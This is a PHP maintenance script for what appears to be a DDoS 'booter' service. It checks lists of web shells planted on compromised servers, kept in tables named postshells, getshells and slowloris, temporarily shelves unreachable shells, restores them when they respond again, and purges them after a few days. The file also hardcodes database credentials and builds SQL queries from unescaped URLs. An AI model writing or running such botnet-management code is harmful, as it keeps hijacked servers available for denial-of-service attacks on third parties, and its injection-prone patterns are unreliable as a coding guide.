<?php

/* START OF CONFIGURATION SECTION */
$mysql_username = 'u1658542_booter';    // MySQL User Name
$mysql_password = 'ddos123';        // MySQL Password
$mysql_hostname = 'localhost';    // MySQL Host Name
$mysql_hostport = 3306;        // MySQL Host Port
$mysql_database = 'u1658542_booter';    // MySQL Database
$mysql_shelltbl = 'shellpool';    // MySQL Table Name (will be created if it does not exist)
$mysql_stengine = 'MyISAM';    // Preferred MySQL Storage Engine (MyISAM, MRG_MyISAM or InnoDB)

$shell_remove = 3; // Number of days before a shell that is offline due to downtime is removed.
$shell_tables = 'postshells,getshells,slowloris'; // Table names where your shells are (comma seperated)
$shell_fields = 'URL,URL,URL'; // Field names where the url is stored in the above table(s) 
/* END OF CONFIGURATION SECTION */

/* DO NOT EDIT ANY FURTHER UNLESS YOU KNOW WHAT YOU ARE DOING! */

set_time_limit(121);
error_reporting(E_PARSE);

$shell_tables = explode(',', $shell_tables);
$shell_fields = explode(',', $shell_fields);

mysql_connect($mysql_hostname.':'.$mysql_hostport, $mysql_username, $mysql_password) OR die ("Unable to establish mysql connection on ".$mysql_hostname.".");
mysql_select_db($mysql_database) OR die ("Unable to connect to mysql database ".$mysql_database.".");

    if (!mysql_query("SELECT * FROM ".$mysql_shelltbl))
        mysql_query("CREATE TABLE `".$mysql_shelltbl."` (`url` VARCHAR( 254 ) NOT NULL ,`uts` int(15) NOT NULL DEFAULT '0',`tbl` VARCHAR( 32 ) NOT NULL ,`qry` LONGTEXT NOT NULL) ENGINE=".$mysql_stengine.";") OR die ("Unable to create table ".$mysql_shelltbl.".");

for ($i = 0; $i <= count($shell_tables)-1; $i++)
{
    $qry[$i] = mysql_query("SHOW COLUMNS FROM ".$shell_tables[$i]) OR die ("Unable to show columns from table ".$shell_tables[$i].".");
    $fields[$shell_tables[$i]] = 0;

    while ($res[$i] = mysql_fetch_assoc($qry[$i]))
    {
        $layout[$shell_tables[$i]][] = $res[$i];
        $fields[$shell_tables[$i]]++;
    }

    $c =-1;
    $sel = mysql_query("SELECT * FROM `".$shell_tables[$i]."`") OR die ("Could not select from table ".$shell_tables[$i].".");

    if (mysql_num_rows($sel) > 0)
        while ($row = mysql_fetch_row($sel))
        {
            $c++;
            $GLOBALS[$shell_tables[$i].'_url'] = $shell_fields[$i];
            for ($x = 0; $x <= $fields[$shell_tables[$i]]-1; $x++)
                if ($layout[$shell_tables[$i]][$x]['Extra'] == 'auto_increment')
        $data[$shell_tables[$i]][$c][$layout[$shell_tables[$i]][$x]['Field']] = 'NULL';
                else
        $data[$shell_tables[$i]][$c][$layout[$shell_tables[$i]][$x]['Field']] = $row[$x];
        }

}

$c =-1;
if (isset($data))
{
    foreach (array_keys($data) as $table)
        foreach (array_keys($data[$table]) as $row)
        {
            $c++;
            $key = array_keys($data[$table][$row]);
            $val = array_map('mysql_real_escape_string', array_values($data[$table][$row]));
            $arr[$c]['url'] = $data[$table][$row][$GLOBALS[$table.'_url']];
            $arr[$c]['fld'] = $GLOBALS[$table.'_url'];
            $arr[$c]['tbl'] = $table;
            $arr[$c]['qry'] = base64_encode('INSERT INTO `'.$table.'` (`'.implode('`,`', $key).'`) VALUES (\''.implode('\',\'', $val).'\');');

        }

    foreach ($arr as $req)
    {
        unset($http_response_header);
        $url = file_get_contents($req['url']);
        if (!$url)
        {
            mysql_query("INSERT INTO `".$mysql_shelltbl."` (`url`, `uts`, `tbl`, `qry`) VALUES ('".$req['url']."', ".time().", '".$req['tbl']."', '".$req['qry']."');");
            mysql_query("DELETE FROM `".$req['tbl']. "` WHERE ".$req['fld']." = '".$req['url']."';");
        }
        elseif (!strstr($http_response_header[0], '200'))
            mysql_query("DELETE FROM `".$req['tbl']. "` WHERE ".$req['fld']." = '".$req['url']."';");
    }

}

$sel = mysql_query("SELECT * FROM `".$mysql_shelltbl."`") OR die ("Could not select from table ".$mysql_shelltbl.".");

if (mysql_num_rows($sel) > 0)
    while ($row = mysql_fetch_row($sel))
    {
        unset($http_response_header);
        $url = file_get_contents($row[0]);
        if (!$url && $row[1] < time() - $shell_remove * 24 * 60 * 60)
            mysql_query("DELETE FROM `".$mysql_shelltbl. "` WHERE url = '".$row[0]."';");
        elseif (strstr($http_response_header[0], '200'))
        {
            mysql_query(base64_decode($row[3]));
            mysql_query("DELETE FROM `".$mysql_shelltbl. "` WHERE url = '".$row[0]."';");
        }
    }
?>